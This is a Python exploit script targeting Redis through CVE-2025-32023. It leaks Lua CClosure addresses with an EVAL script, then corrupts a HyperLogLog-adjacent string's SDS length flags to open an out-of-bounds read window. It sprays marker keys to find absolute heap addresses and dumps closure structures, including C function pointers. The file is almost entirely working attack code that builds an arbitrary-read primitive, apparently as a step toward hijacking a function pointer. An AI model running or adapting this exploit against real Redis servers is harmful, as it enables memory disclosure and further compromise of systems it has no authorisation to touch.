#!/usr/bin/env python3
"""
Open the CVE-2025-32023 SDS window and use a heap marker to recover B's
absolute SDS address, then read known Lua CClosure objects by address.

This is read-only after the SDS flags corruption: it does not overwrite
CClosure.f or trigger the module-free callback.
"""
import argparse
import os
import socket
import struct
import sys
import time

import redis_hll_guarded_probe as hll


LUA_LEAK = r"""
local r = {}
local fns = {
    loadstring, pcall, tostring, type, rawget, rawset,
    setmetatable, getmetatable, select, unpack, pairs,
    collectgarbage, tonumber, error, assert, ipairs, next
}
local names = {
    'loadstring','pcall','tostring','type','rawget','rawset',
    'setmetatable','getmetatable','select','unpack','pairs',
    'collectgarbage','tonumber','error','assert','ipairs','next'
}
for i,f in ipairs(fns) do
    r[#r+1] = names[i] .. '=' .. tostring(f)
end
return table.concat(r, '|')
"""


def parse_lua_closure_addrs(text):
    if isinstance(text, bytes):
        text = text.decode(errors="replace")
    out = {}
    for part in str(text).split("|"):
        if "=" not in part or ": " not in part:
            continue
        name, rest = part.split("=", 1)
        try:
            out[name.strip()] = int(rest.split(": ", 1)[1].strip(), 16)
        except ValueError:
            pass
    return out


def qword_at(data, off):
    if len(data) < off + 8:
        return None
    return struct.unpack_from("<Q", data, off)[0]


def classify_ptr(v):
    if v is None:
        return ""
    if 0x800000000 <= v < 0x900000000:
        return "heap"
    if 0x400000 <= v < 0x2000000:
        return "eboot?"
    if 0x200000000 <= v < 0x300000000:
        return "lib?"
    if 0x200000000000 <= v < 0x800000000000:
        return "highlib?"
    return ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.50.192")
    ap.add_argument("--port", type=int, default=1003)
    ap.add_argument("--prefix", default=None)
    ap.add_argument("--eggs", type=int, default=512)
    ap.add_argument("--scan-size", type=lambda x: int(x, 0), default=0x200000)
    ap.add_argument("--keep", action="store_true", help="leave Redis keys in place")
    ap.add_argument("--restore", action="store_true", help="attempt to restore B flags before exit")
    args = ap.parse_args()

    prefix = args.prefix or f"cx:hll:cclos:{os.getpid()}:{int(time.time())}"
    sock = socket.socket()
    sock.settimeout(20)

    original_hll_max = None
    flags_reg = None
    b_corrupted = False

    print("=== Redis HLL CClosure Leak ===")
    print(f"target={args.host}:{args.port} prefix={prefix}")

    try:
        sock.connect((args.host, args.port))
        print(f"PING: {hll.cmd(sock, 'PING')}")
        original_hll_max = hll.redis_config_get(sock, "hll-sparse-max-bytes")
        print(f"hll-sparse-max-bytes original={original_hll_max}")
        hll.redis_config_set(sock, "hll-sparse-max-bytes", hll.HIGH_HLL_MAX)

        addrs = parse_lua_closure_addrs(hll.cmd(sock, "EVAL", LUA_LEAK, "0"))
        if not addrs:
            raise RuntimeError("Lua CClosure address leak returned no addresses")
        print("\n[1] Lua CClosure addresses")
        for name, addr in sorted(addrs.items(), key=lambda item: item[1]):
            print(f"  {name:14s} 0x{addr:X}")
        lua_min, lua_max = min(addrs.values()), max(addrs.values())
        print(f"  range=0x{lua_min:X}..0x{lua_max:X}")

        print("\n[2] HLL layout + calibration")
        hll.setup_layout(sock, prefix)
        _b_original, cal, flags_reg, changes = hll.find_calibration(sock, prefix)
        if cal < 0:
            raise RuntimeError("calibration produced no B byte change")
        print(f"cal_byte={cal} flags_reg={flags_reg} changes={len(changes)}")

        print("\n[3] opening SDS_TYPE_32 window without restore")
        hll.write_flags(sock, prefix, flags_reg, 3, "flags32")
        b_corrupted = True
        b_key = hll.key(prefix, "B")
        window = hll.cmd(sock, "STRLEN", b_key)
        print(f"STRLEN(B)={window}")
        if not (isinstance(window, int) and window > hll.SZ):
            raise RuntimeError("B did not inflate")

        marker = b"CCLEAK_" + struct.pack("<I", os.getpid())
        print(f"\n[4] spraying {args.eggs} marker eggs")
        for i in range(args.eggs):
            value = marker + struct.pack("<I", i) + b"C" * 24
            hll.cmd(sock, "SET", hll.key(prefix, f"egg{i:04d}"), value)

        marker_off = hll.find_marker_offset(sock, b_key, marker, hll.SZ, min(window, args.scan_size))
        if marker_off is None:
            raise RuntimeError("could not find marker in B window")
        idx_raw = hll.cmd(
            sock,
            "GETRANGE",
            b_key,
            str(marker_off + len(marker)),
            str(marker_off + len(marker) + 3),
            timeout=60,
        )
        if not isinstance(idx_raw, bytes) or len(idx_raw) != 4:
            raise RuntimeError("could not read marker index")
        egg_idx = struct.unpack("<I", idx_raw)[0]
        egg_key = hll.key(prefix, f"egg{egg_idx:04d}")
        egg_robj, _egg_dbg = hll.debug_object_addr(sock, egg_key)
        egg_data = egg_robj + 19
        b_sds = egg_data - marker_off
        print(f"marker egg{egg_idx:04d} at B+0x{marker_off:X}")
        print(f"egg_robj=0x{egg_robj:X} egg_data=0x{egg_data:X}")
        print(f"B_sds=0x{b_sds:X} window_end=0x{b_sds + window:X}")

        print("\n[5] CClosure reads")
        got = 0
        for name, addr in sorted(addrs.items(), key=lambda item: item[1]):
            off = addr - b_sds
            if not (0 <= off and off + 0x48 < window):
                print(f"  {name:14s} off=0x{off:X} OUT_OF_WINDOW")
                continue
            raw = hll.cmd(sock, "GETRANGE", b_key, str(off), str(off + 0x47), timeout=60)
            if not isinstance(raw, bytes) or len(raw) < 0x40:
                print(f"  {name:14s} off=0x{off:X} READ_FAILED {raw!r}")
                continue
            got += 1
            nxt = qword_at(raw, 0)
            gclist = qword_at(raw, 0x18)
            cfunc = qword_at(raw, 0x20)
            print(
                f"  {name:14s} off=0x{off:X} tt=0x{raw[8]:02X} marked=0x{raw[9]:02X} "
                f"isC=0x{raw[0x10]:02X} nup=0x{raw[0x11]:02X}"
            )
            print(
                f"      next=0x{nxt:016X} {classify_ptr(nxt):8s} "
                f"gclist=0x{gclist:016X} {classify_ptr(gclist):8s} "
                f"f=0x{cfunc:016X} {classify_ptr(cfunc)}"
            )
        print(f"\nRESULT: read {got}/{len(addrs)} CClosure objects")
        return 0 if got else 2

    except Exception as exc:
        print(f"ERROR: {exc}")
        return 1
    finally:
        if args.restore and flags_reg is not None:
            try:
                print("\n[restore] writing SDS_TYPE_16")
                hll.write_flags(sock, prefix, flags_reg, 2, "restore16")
                restored_len = hll.cmd(sock, "STRLEN", hll.key(prefix, "B"))
                print(f"restore_strlen={restored_len}")
                b_corrupted = restored_len != hll.SZ
            except Exception as exc:
                print(f"[!] restore failed: {exc}")
        try:
            if original_hll_max is not None:
                hll.redis_config_set(sock, "hll-sparse-max-bytes", original_hll_max)
                print(f"hll-sparse-max-bytes restored={original_hll_max}")
        except Exception as exc:
            print(f"[!] config restore failed: {exc}")
        if not args.keep:
            try:
                names = [hll.key(prefix, f"egg{i:04d}") for i in range(args.eggs)]
                for i in range(0, len(names), 64):
                    hll.cmd(sock, "DEL", *names[i:i + 64], timeout=30)
                hll.cleanup(sock, prefix, include_b=not b_corrupted)
                print(f"cleanup include_b={not b_corrupted}")
            except Exception as exc:
                print(f"[!] cleanup failed: {exc}")
        try:
            sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(main())
